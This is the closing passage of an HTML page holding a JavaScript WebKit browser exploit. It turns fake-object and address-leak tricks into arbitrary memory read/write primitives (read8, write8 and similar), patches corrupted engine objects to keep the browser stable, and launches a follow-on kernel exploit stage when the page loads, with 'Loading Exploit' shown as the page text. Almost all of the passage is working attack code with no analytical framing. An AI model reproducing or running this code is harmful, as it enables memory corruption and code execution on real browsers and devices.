        read_mem_setup(p, data.length);
        for (var i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        var magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    //fix fucked objects to stabilize webkit

    (function () {
        //fix fontfaceset (memmoved 96 bytes to low, move back)
        var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        //fix strings (restore "valid") header
        for (var i = 0; i < needfix.length; i++) {
            var addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        //fix array butterfly
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.

    //create compat stuff for kexploit.js
    var expl_master = new Uint32Array(8);
    var expl_slave = new Uint32Array(2);
    var addrof_expl_slave = addrof(expl_slave);
    var m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    var prim = {
        write8: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
                expl_slave[1] = value.hi;
            } else {
                expl_slave[0] = value;
                expl_slave[1] = 0;
            }
        },
        write4: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
            } else {
                expl_slave[0] = value;
            }
        },
        write2: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFF0000;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFFFF00;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return new int64(expl_slave[0], expl_slave[1]);
        },
        read4: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0];
        },
        read2: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFFFF;
        },
        read1: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFF;
        },
        leakval: function (obj) {
            obj_slave.obj = obj;
            return new int64(obj_master[4], obj_master[5]);
        }
    };
    window.p = prim;
    run_hax();
}
</script>
</head>
<body onload="setTimeout(poc, 1500);">
<div class="info" id="message">Loading Exploit, Please Wait ...</div>
</body>
</html>